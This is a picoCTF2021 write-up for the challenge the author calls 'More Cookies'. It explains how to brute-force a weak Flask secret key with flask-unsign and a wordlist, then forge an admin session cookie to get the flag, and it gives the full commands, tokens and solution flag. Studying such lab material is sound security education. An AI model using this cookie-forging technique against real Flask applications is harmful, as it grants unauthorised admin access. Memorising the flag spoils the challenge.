# picoCTF2021 More Cookies Write Up

## Description

> Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/e99686c2e3e6cdd9e355f1d10c9d80d6/server.py) [http://mercury.picoctf.net:53700/](http://mercury.picoctf.net:53700/)

## Solution

From the users perspective this application works identically to the one in the original cookies CTF - the user types in a cookie name and the application returns whether the input is a known cookie. This challenge differs in that the cookies used are flask tokens. Flask tokens are signed, meaning that the brute forcing approach used in the original cookies challenge is unfeasible.

The challenge includes a `server.py` file, containing the code being run on the server. Of particular interest now are the first few lines of the file:

```python
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)
```

In particular the last two lines are important. The second to last line saves a variety of cookie names in the variable `cookie_names`. The last line assigns the secret key of the application to be a random value from `cookie_names` i.e. the secret key used to sign the flask token is taken from this list of cookies. This information is useful for two reasons:

1. In order to create custom cookies the secret key is needed to sign these cookies.
2. Knowing the secret key is one of these cookie names greatly reduces the number of secret keys we need to check (the only alternative is to brute force the secret key).

In order to determine the specific secret key I used [flask-unsign](https://github.com/Paradoxis/Flask-Unsign), a command line utility for cracking flask tokens. First, I put the strings from `cookie_names` in a file called `wordlists.txt`, with each cookie name on a separate line:

```
snickerdoodle
chocolate chip
oatmeal raisin
...
```

Next I grabbed the session token (cookie) from the website. This will vary from browser to browser, but for me (using Firefox) I was able to access it by opening the developer tools, accessing the storage section followed by the cookie section (the cookie is the value). For me the cookie was:

```
eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.ZnLERQ.6aY588dXxa2ik4tBS7aTenCQjkI
```

With these pieces of data I could then run `flask-unsign` with the following arguments:

```
flask-unsign --wordlist wordlist.txt --unsign --cookie 'eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.ZnLERQ.6aY588dXxa2ik4tBS7aTenCQjkI' --no-literal-eval
```

This produced the following output:

```
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 29 attempts
b'peanut butter'
```

Thus the secret key is `peanut butter`. Note that if the app is restarted, the secret key will change (due to the random choice).

Knowing the secret key is half (and arguably the hardest half) of the challenge completed. All that remains is determining what our flask token should contain. Observe that the flask token is made up of three sections separated by periods. The first section contains the tokens data, base 64 encoded. Decoding the first section of the above token produces the following output:

```
{"very_auth": "blank"}
```

One would (correctly) assume that we would like to change `"blank"` to something of our own choosing. Analysing the `server.py` file again reveals to us what that choice should be:

```python
@app.route("/display", methods=["GET"])
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp

```

Observe that the `flag.html` file is returned if `session["very_auth"]` is equal to `admin`. Thus it is clear that `"blank"` should be changed to `"admin"`.

To actually create the token we can use the `flask-unsign` utility again:

```
flask-unsign --sign --cookie '{"very_auth": "admin"}' --secret "peanut butter"
```

Which produces the following output:

```
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZnLGLA.ar4k_bHaYQoYEl7X7o88J-yfoeM
```

Setting this flask token as the cookie for the website and refreshing the page produces the flag:

```
`picoCTF{pwn_4ll_th3_cook1E5_3646b931}`
```

